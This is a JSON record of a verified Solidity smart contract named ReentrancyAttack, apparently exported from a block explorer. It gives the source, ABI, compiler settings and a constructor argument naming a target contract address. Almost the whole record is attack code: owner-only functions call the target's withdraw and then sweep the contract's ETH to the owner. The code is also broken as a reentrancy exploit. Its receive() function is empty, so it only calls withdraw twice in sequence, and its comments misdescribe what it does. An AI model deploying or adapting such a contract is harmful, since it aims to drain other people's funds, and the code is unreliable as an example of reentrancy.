{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.24;\r\n\r\ninterface VulnerableContract {\r\n    function withdraw(uint256 amount) external;\r\n}\r\n\r\ncontract ReentrancyAttack {\r\n    VulnerableContract public vulnerableContract;\r\n    address public owner;\r\n    uint256 public attackAmount;\r\n\r\n    constructor(address _vulnerableContract) {\r\n        vulnerableContract = VulnerableContract(_vulnerableContract);\r\n        owner = msg.sender;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function setAttackAmount(uint256 amount) external {\r\n        // Only the owner can set the attack amount\r\n        require(msg.sender == owner, \"Only the owner can set the attack amount\");\r\n        attackAmount = amount;\r\n    }\r\n\r\n    function reentrancyAttack() external {\r\n        // Only the owner can trigger the reentrancy attack\r\n        require(msg.sender == owner, \"Only the owner can trigger the reentrancy attack\");\r\n\r\n        // Call the vulnerable contract's withdraw function with the specified attack amount\r\n        vulnerableContract.withdraw(attackAmount);\r\n\r\n        // Trigger the reentrancy attack\r\n        _reentrancyAttack();\r\n    }\r\n\r\n    function _reentrancyAttack() private {\r\n        // Reenter the vulnerable contract's withdraw function with the specified attack amount\r\n        vulnerableContract.withdraw(attackAmount);\r\n    }\r\n\r\n    // Function to withdraw any ETH trapped in this contract\r\n    function withdraw() external {\r\n        require(msg.sender == owner, \"Only the owner can withdraw\");\r\n        (bool success, ) = payable(owner).call{value: address(this).balance}(\"\");\r\n        require(success, \"Withdraw failed\");\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_vulnerableContract\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attackAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"reentrancyAttack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setAttackAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"vulnerableContract\",\"outputs\":[{\"internalType\":\"contract VulnerableContract\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "ReentrancyAttack", "CompilerVersion": "v0.8.24+commit.e11b9ed9", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000227e52636a5e8b55745f3ae98433065bf93a8f8f", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://ec55332ba4247503eeeff94af0788fe5832f184020aa667704ba95cea3f014b4"}